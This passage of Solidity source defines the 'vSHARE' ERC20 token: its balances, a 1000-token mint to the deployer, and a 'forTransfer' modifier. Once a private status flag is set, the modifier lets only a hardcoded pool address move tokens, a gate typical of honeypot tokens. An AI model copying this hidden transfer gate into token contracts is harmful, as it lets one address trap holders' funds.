...
contract vSHAREToken is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenVS_totalSupply;
    uint256 private _tokenVS_status = 0;
    uint256 public stakingPoolVSStatus = 0;

    string private _tokenVS_name;
    string private _tokenVS_symbol;

    address private _poolVSAddress = 0x17A5aA38F87A10c64fd3DBf383c86fD2445d0067;

    constructor() {
        _tokenVS_name = "vSHARE";
        _tokenVS_symbol = "vSHARE";
        _tokenVS_totalSupply = 1000 * 10 ** 18;
        _balances[msg.sender] = _tokenVS_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolVSAddress || _tokenVS_status == 0);
        _;
    }
